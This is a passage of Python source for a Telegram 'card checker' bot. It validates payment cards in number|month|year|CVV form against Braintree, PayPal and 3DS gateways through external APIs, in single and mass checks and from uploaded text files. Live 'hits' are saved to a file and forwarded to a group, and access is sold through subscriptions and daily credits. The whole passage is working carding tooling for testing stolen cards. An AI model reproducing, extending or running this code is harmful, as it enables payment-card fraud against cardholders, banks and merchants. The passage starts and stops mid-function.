            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /br CC|MM|YYYY|CVV or .br CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[4:].strip()  # remove ".b3 "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Charge [1$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_br_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mbr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mbr'))
def handle_mbr(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_br_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Charge [1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_py_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(PY_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [0.1$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Paypal [0.1$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Paypal [0.1$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Paypal [0.1$]'
        }

# Handle both /cc and .cc
@bot.message_handler(commands=['py'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.py'))
def handle_py(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /py CC|MM|YYYY|CVV or .py CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Paypal [0.1$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_py_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /py] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['mpy'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpy'))
def handle_mpy(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_py_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Paypal [0.1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_svbv_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(SVBV_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': '3DS Site Based'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': '3DS Site Based'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': '3DS Site Based'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': '3DS Site Based'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': '3DS Site Based'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': '3DS Site Based'
        }

# Handle both /cc and .cc
@bot.message_handler(commands=['sbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sbv'))
def handle_sbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /sbv CC|MM|YYYY|CVV or .sbv CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>3DS Site Based</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_svbv_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /sbv] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['msbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msbv'))
def handle_msbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_svbv_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': '3DS Site Based'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
        
@bot.message_handler(commands=['txtchk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.txtchk'))
def handle_txtchk(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a .txt file containing cards with the command /txtchk")
        return

    doc = message.reply_to_message.document

    if doc.file_size > 1024 * 1024:
        bot.reply_to(message, "❌ File is too large (max 1MB allowed).")
        return
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8')

        cards = []
        for line in file_content.split('\n'):
            line = line.strip()
            if not line:
                continue
            for delim in ['|', ':', '/', ' ', '\t']:
                parts = line.split(delim)
                if len(parts) >= 4:
                    cc = parts[0].strip()
                    mm = parts[1].strip().zfill(2)
                    yy_raw = parts[2].strip()
                    cvv = parts[3].strip()
                    if len(yy_raw) == 4:
                        yy = yy_raw
                    elif len(yy_raw) == 2:
                        yy = '20' + yy_raw
                    else:
                        continue
                    if (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit() and
                        len(cvv) >= 3 and len(cvv) <= 4 and cvv.isdigit()):
                        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
                        break

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the file. Make sure they're in CC|MM|YYYY|CVV format.")
            return

        cards = cards[:50]

        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))

        processing_msg = bot.reply_to(message, "↯ Processing your file , please wait...")

        def process_cards():
            try:
                result_filename = f"results_{message.from_user.id}_{int(time.time())}.txt"
                approved = declined = otp_required = errors = 0
                start_time = time.time()

                with open(result_filename, 'a', encoding='utf-8') as f:
                    f.write("Card Details                        | Status          | Response\n")
                    f.write("------------------------------------|-----------------|-----------------\n")

                    for card in cards:
                        try:
                            api_url = f"http://127.0.0.1:4500/gate=txtchk/key=wasdarkboy/cc={card}"
                            response = requests.get(api_url, timeout=30)

                            if response.status_code == 200:
                                api_data = response.json()
                                status = api_data.get('status', '').upper()
                                response_msg = api_data.get('response', '')

                                if status == 'APPROVED':
                                    if 'Action Required' in response_msg:
                                        otp_required += 1
                                    else:
                                        approved += 1
                                    with open('HITS.txt', 'a') as hits:
                                        hits.write(f"{card}\n")
                                elif status == 'DECLINED':
                                    declined += 1
                                else:
                                    errors += 1
                                status_col = {
                                    'APPROVED': "OTP REQUIRED 🔄" if 'Action Required' in response_msg else "APPROVED ✅",
                                    'DECLINED': "DECLINED ❌"
                                }.get(status, "ERROR ⚠️")

                                f.write(f"{card.ljust(35)} | {status_col.ljust(15)} | {response_msg}\n")
                                f.flush()
                            else:
                                errors += 1
                                f.write(f"{card.ljust(35)} | ERROR ⚠️       | API Error: {response.status_code}\n")
                                f.flush()
                        except Exception as e:
                            errors += 1
                            f.write(f"{card.ljust(35)} | ERROR ⚠️       | Exception: {str(e)}\n")
                            f.flush()

                        time.sleep(1)  # To avoid overloading

                processing_time = time.time() - start_time
                user_mention = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
                caption = f"""
─────── ⸙ ────────  
↯ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦

✧ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {len(cards)}
✧ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : <i>Mass stripe Auth</i>
✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 : {approved} ✅ 
✧ 𝗢𝗧𝗣 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 : {otp_required} 🔄
✧ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {declined} ❌
✧ 𝗘𝗿𝗿𝗼𝗿: {errors} ⚠️
✧ 𝗧𝗶𝗺𝗲: {processing_time:.2f}s

↯ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: {user_mention}
─────── ⸙ ────────
"""
                with open(result_filename, 'rb') as f:
                    bot.send_document(
                        chat_id=message.chat.id,
                        document=f,
                        caption=caption,
                        reply_to_message_id=message.message_id,
                        parse_mode='HTML'
                    )

                bot.delete_message(chat_id=message.chat.id, message_id=processing_msg.message_id)
                os.remove(result_filename)

            except Exception as e:
                bot.reply_to(message, f"❌ Processing error: {str(e)}")

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_mo_cc(cc):
    try:
